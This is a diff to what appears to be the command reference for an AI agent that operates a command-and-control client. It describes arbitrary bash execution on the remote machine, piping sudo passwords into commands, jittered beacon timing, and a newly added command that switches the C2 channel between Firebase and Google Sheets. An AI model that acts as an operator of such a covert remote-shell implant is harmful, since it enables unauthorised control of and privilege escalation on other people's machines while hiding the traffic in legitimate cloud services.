@@ -4,6 +4,7 @@ Available commands:
 - system_info: No payload. Returns OS, hostname, Python version, architecture.
 - echo: Payload {"msg": "string"}. Echoes back the payload.
 - shell: Payload {"cmd": "bash command", "stdin": "optional input string"}. Runs an arbitrary bash command. Use for everything that isn't system_info or echo. The "stdin" field is for interactive commands that read from stdin (e.g. passwd reading a new password). NEVER use stdin for sudo passwords — always use the pipe pattern in cmd instead: "echo 'password' | sudo -S <command>".
+- switch_channel: Payload {"channel": "firebase"|"sheets"}. Switches the active C2 channel on the client. The ACK is sent back on the current channel — the server automatically mirrors the switch. Use this to change the communication channel mid-session without restarting. Only use when the operator explicitly asks to switch channels.
 - config: Payload with any subset of {"cycle_interval_sec": "1", "cycle_jitter_min": "2", "cycle_jitter_max": "3", "client_id": "NADAV", "heartbeat_every": "5"}. Updates the client's cycle timing (how often the client wakes and checks for commands). Only the listed keys are accepted — unknown keys are silently ignored. Changes are in-memory only and reset on client restart. Returns {"updated": {...}, "current": {...}}.
 
 Client context:
